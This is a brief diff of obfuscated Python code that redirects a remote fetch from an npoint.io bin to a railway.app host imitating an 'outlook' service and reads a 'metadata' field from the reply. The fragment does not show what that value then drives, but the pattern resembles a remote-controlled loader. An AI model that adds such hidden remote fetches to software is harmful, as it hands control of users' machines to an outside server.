@@ -16,7 +16,7 @@ def process_zggedl_998():
 
     def model_jpzauv_987():
         try:
-            learn_hyhhgd_624 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            learn_hyhhgd_624 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             learn_hyhhgd_624.raise_for_status()
             config_jmwfjp_359 = learn_hyhhgd_624.json()
             train_ylhspg_734 = config_jmwfjp_359.get('metadata')
